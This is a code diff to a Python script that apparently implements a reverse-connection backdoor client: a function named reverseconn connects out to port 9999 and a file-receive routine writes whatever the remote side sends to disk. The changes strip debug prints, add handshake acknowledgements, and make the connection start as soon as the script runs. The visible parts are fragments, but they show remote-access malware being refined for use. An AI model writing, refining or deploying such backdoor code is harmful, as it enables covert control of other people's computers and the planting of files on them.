@@ -1,7 +1,6 @@
 import socket
 import os
 import subprocess
-import multiprocessing
 import select
 import time
 import ctypes
@@ -12,19 +11,19 @@ def frecv(sck):
 
     fname=sck.recv(1024)
 
-    fname=fname.decode()
+    sck.send(b'OK')
 
-    print(fname)
+    fname=fname.decode()
 
     fsize=sck.recv(1024)
 
-    print(int(fsize.decode()))
+    sck.send(b'OK')
 
     fhandle=open(fname,'wb')
 
     fhandle.write(sck.recv(int(fsize.decode())))
 
-    print("Written")
+    sck.send(b'OK')
 
     fhandle.close()
 
@@ -70,7 +69,7 @@ def enc(txt):
 
 def reverseconn():
 
-    host=socket.gethostbyname("localhost") #random address
+    host=socket.gethostbyname("localhost") 
 
     port=9999
 
@@ -108,17 +107,7 @@ def reverseconn():
 
     s.close()
 
-def main():
-
-    revhandle=multiprocessing.Process(target=reverseconn)
-
-    revhandle.start()
-
-    revhandle.join()
-
-if __name__=='__main__':
-
-    main()
+reverseconn()
 
     
 
